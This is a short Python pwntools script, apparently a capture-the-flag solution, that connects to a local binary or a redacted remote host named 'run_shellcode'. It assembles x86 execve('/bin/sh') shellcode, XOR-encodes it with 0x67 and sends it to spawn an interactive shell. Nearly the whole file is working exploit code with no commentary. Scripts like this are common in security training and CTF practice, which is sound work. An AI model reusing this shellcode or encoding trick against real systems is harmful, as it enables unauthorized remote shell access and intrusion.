from pwn import *
import sys

# context.terminal = ['konsole', '-e']  # needed if you want to debug with gdb (set with your own terminal)
# context.log_level = 'debug'
# context.arch = 'X86'

#########################################################
BINARY="./run_shellcode"   # path to the binary file
ENV={}      # list of enviroment variables, useful if you need to use a given library
GDB=""      # commands to execute if you debug using gdb
HOST="redacted.it"     # host for remote connection
PORT=5013   # port for remote connection 
#########################################################

if len(sys.argv) < 2:
    print("args: bin|net|ida|gdb\n")
    sys.exit(1)

if sys.argv[1] == "bin":
    p = process(BINARY, env=ENV)
elif sys.argv[1] == "net":
    p = remote(HOST, PORT)
elif sys.argv[1] == "ida":
    # remote ida debugger can bu found at ~/.wine/drive_c/Program\ Files/IDA\ 7.5/dbgsrv/linux_server
    p = process("./linux_server", env=ENV)
    p.recvuntil(b"0.1...")
elif sys.argv[1] == "gdb":
    p = process(BINARY, env=ENV)
    gdb.attach(p, GDB)
else:
    print("args: bin|net|ida|gdb")
    sys.exit(1)

binary = ELF(BINARY)    # creates an ELF object useful to access easily symbols in the binary

shellcode = asm('''
    xor ecx, ecx
    xor edx, edx
    push 0x68732f
    push 0x6e69622f
    mov ebx, esp
    mov eax, 0xb
    int 0x80
    ''')

p.recvuntil('Send the shellcode: \n')
shellcode = b''.join([bytes([b ^ 0x67]) for b in shellcode])
print(shellcode)

p.sendline(shellcode)

p.interactive()
